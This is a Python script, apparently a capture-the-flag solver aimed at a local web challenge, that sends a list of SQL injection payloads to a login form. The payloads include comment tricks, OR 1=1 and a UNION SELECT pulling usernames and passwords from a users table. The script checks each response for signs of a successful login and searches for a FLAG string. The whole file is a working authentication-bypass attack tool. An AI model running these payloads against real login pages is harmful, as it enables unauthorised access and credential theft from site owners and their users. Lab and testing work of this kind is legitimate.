import requests
import base64
import re

# Target and endpoint information
target_url = "http://127.0.0.1:33082/index.php"
session = requests.Session()

# Test various SQL injection payloads for bypassing authentication
payloads = [
    # Classic authentication bypass
    "admin' -- ",
    "admin' #",
    "admin'/*",
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR '1'='1' #",
    "' OR '1'='1'",
    
    # More aggressive bypass attempts
    "' OR 1=1 LIMIT 1 -- ",
    "admin' OR '1'='1' -- ",
    "admin' OR 1=1 -- ",
    "' UNION SELECT 1,2,3 -- ",
    "' UNION SELECT 1,username,password FROM users -- ",
    
    # Boolean-based injections
    "' AND 1=1 -- ",
    "' AND 1=2 -- ",
    
    # Comment variations
    "admin'; -- ",
    "admin';#",
]

print("=" * 80)
print("SQL INJECTION AUTHENTICATION BYPASS TEST")
print(f"Target: {target_url}")
print("=" * 80)

successful_payloads = []
all_responses = []

for idx, payload in enumerate(payloads, 1):
    print(f"\n[TEST {idx}] Testing payload: {payload}")
    print("-" * 60)
    
    # Prepare POST data
    data = {
        'username': payload,
        'password': 'anything'  # Password can be anything due to comment
    }
    
    try:
        # Send login attempt
        response = session.post(target_url, data=data, allow_redirects=True, timeout=10)
        
        # Store response info
        response_info = {
            'payload': payload,
            'status_code': response.status_code,
            'content_length': len(response.content),
            'cookies': dict(response.cookies),
            'has_redirect': len(response.history) > 0,
            'final_url': response.url,
            'text_sample': response.text[:2000] if response.text else ''
        }
        all_responses.append(response_info)
        
        # Print detailed information
        print(f"[-] Status Code: {response.status_code}")
        print(f"[-] Content Length: {len(response.content)} bytes")
        print(f"[-] Final URL: {response.url}")
        print(f"[-] Redirects: {len(response.history)} ({'Yes' if response.history else 'No'})")
        
        # Check cookies
        if response.cookies:
            print(f"[-] Cookies Set: {dict(response.cookies)}")
        else:
            print("[-] Cookies Set: None")
        
        # Check for authentication success indicators
        success_indicators = [
            'dashboard',
            'welcome',
            'logged in',
            'success',
            'profile',
            'home',
            'flag',
            'admin'
        ]
        
        lower_text = response.text.lower()
        found_indicators = [ind for ind in success_indicators if ind in lower_text]
        
        if found_indicators:
            print(f"[+] SUCCESS INDICATORS FOUND: {found_indicators}")
            successful_payloads.append(payload)
        
        # Check for flag in response
        flag_pattern = r'FLAG\{[^}]+\}'
        flags = re.findall(flag_pattern, response.text, re.IGNORECASE)
        
        if flags:
            print(f"[!] FLAG FOUND: {flags}")
            print("\n[!] FULL RESPONSE CONTAINING FLAG:")
            print(response.text)
        else:
            print(f"[-] Flag: Not found in response")
            
        # If redirect occurred, print redirect chain
        if response.history:
            print("\n[-] Redirect Chain:")
            for i, resp in enumerate(response.history, 1):
                print(f"  {i}. {resp.status_code} -> {resp.url}")
        
        # Print sample of response text
        if len(response.text) > 0:
            print(f"\n[-] Response Preview (first 500 chars):")
            print(response.text[:500])
        
        # Look for SQL error messages (even if bypass works)
        sql_errors = [
            'sql', 'mysql', 'sqlite', 'postgresql', 'database',
            'error', 'syntax', 'query failed', 'union',
            'unknown column', 'table', 'select'
        ]
        
        sql_indicators = []
        for error in sql_errors:
            if error in lower_text:
                sql_indicators.append(error)
        
        if sql_indicators:
            print(f"\n[!] SQL-RELATED TERMS IN RESPONSE: {sql_indicators}")
            
    except Exception as e:
        print(f"[!] ERROR: {str(e)}")
        continue

# Summary
print("\n" + "=" * 80)
print("SUMMARY")
print("=" * 80)
print(f"[*] Total payloads tested: {len(payloads)}")
print(f"[*] Successful payloads (showing indicators): {len(successful_payloads)}")

if successful_payloads:
    print("\n[*] Successful payloads:")
    for i, sp in enumerate(successful_payloads, 1):
        print(f"  {i}. {sp}")

# Check if any flag was found overall
all_flags = []
for resp_info in all_responses:
    flags = re.findall(r'FLAG\{[^}]+\}', resp_info['text_sample'], re.IGNORECASE)
    all_flags.extend(flags)

if all_flags:
    print(f"\n[!] FLAGS FOUND: {all_flags}")
else:
    print("\n[!] No FLAG pattern found in any responses")
    print("[!] May need to access additional pages after authentication")
    
    # If we have successful payloads, try to access other pages that might contain the flag
    if successful_payloads:
        print("\n[*] Attempting to access potential flag pages with successful auth...")
        
        # Reset session and login with successful payload
        session = requests.Session()
        best_payload = successful_payloads[0]
        
        print(f"[*] Using payload: {best_payload}")
        login_data = {'username': best_payload, 'password': 'anything'}
        login_resp = session.post(target_url, data=login_data, timeout=10)
        
        print(f"[*] Login response status: {login_resp.status_code}")
        print(f"[*] Session cookies: {dict(session.cookies)}")
        
        # The target will be checked from the login response
        # If login was successful, the flag might be in the response
        flag_pattern = r'FLAG\{[^}]+\}'
        flags_in_login = re.findall(flag_pattern, login_resp.text, re.IGNORECASE)
        
        if flags_in_login:
            print(f"[!] FLAG FOUND IN LOGIN RESPONSE: {flags_in_login}")
            print("\n[!] FULL LOGIN RESPONSE:")
            print(login_resp.text)
        else:
            print("[!] No flag in login response")
